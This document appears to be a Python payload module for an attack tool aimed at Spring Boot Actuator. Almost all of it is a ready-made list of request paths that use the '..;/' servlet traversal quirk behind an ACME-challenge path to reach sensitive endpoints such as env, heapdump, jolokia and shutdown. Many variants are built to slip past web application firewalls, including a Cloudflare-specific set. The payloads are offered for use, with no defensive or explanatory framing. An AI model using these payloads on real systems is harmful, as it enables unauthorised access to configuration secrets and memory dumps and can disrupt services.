#!/usr/bin/env python3
"""
Spring Boot Actuator Payloads with WAF Bypass
Using ..;/ traversal (servlet stack quirk)
"""

ACTUATOR_PAYLOADS = [
    # Basic Actuator endpoints
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/health",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/info",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/heapdump",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/threaddump",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/mappings",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/configprops",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/beans",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/metrics",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/loggers",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/scheduledtasks",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/conditions",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/jolokia",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/prometheus",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/gateway/routes",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/refresh",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/caches",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/shutdown",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/flyway",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/liquibase",
    
    # Depth variations
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/..;/actuator/env",
    
    # ============================================
    # WAF BYPASS VARIATIONS
    # ============================================
    
    # URL Encoded traversal
    "/.well-known/acme-challenge/{token}/%2e%2e;/%2e%2e;/%2e%2e;/actuator/env",
    "/.well-known/acme-challenge/{token}/%2e%2e%3b/%2e%2e%3b/actuator/health",
    "/.well-known/acme-challenge/{token}/../%2e%2e/actuator/heapdump",
    
    # Double URL Encoded
    "/.well-known/acme-challenge/{token}/%252e%252e;/%252e%252e;/actuator/env",
    "/.well-known/acme-challenge/{token}/%252e%252e%253b/%252e%252e%253b/actuator/env",
    
    # Unicode/Overlong encoding
    "/.well-known/acme-challenge/{token}/..%c0%af..%c0%af..%c0%af/actuator/env",
    "/.well-known/acme-challenge/{token}/..%ef%bc%8f..%ef%bc%8f/actuator/env",
    
    # Case manipulation
    "/.well-known/acme-challenge/{token}/..;/..;/ACTUATOR/ENV",
    "/.well-known/acme-challenge/{token}/..;/..;/Actuator/Env",
    "/.well-known/acme-challenge/{token}/..;/..;/AcTuAtOr/eNv",
    
    # Null byte injection
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env%00",
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env%00.html",
    "/.well-known/acme-challenge/{token}%00/..;/..;/actuator/env",
    
    # Path parameter bypass
    "/.well-known/acme-challenge/{token}/..;/..;/actuator;/env",
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/;/env",
    "/.well-known/acme-challenge/{token}/..;/..;/actuator./env",
    
    # Double slash
    "/.well-known/acme-challenge/{token}/..;/..;//actuator/env",
    "/.well-known/acme-challenge/{token}//..;/..;/actuator/env",
    
    # Fragment/Query bypass
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env#",
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env?",
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env?bypass=1",
    
    # Cloudflare specific bypass
    "/cdn-cgi/../actuator/env",
    "/cdn-cgi/..;/actuator/env",
    "/cdn-cgi/../.well-known/acme-challenge/{token}/../actuator/env",
]
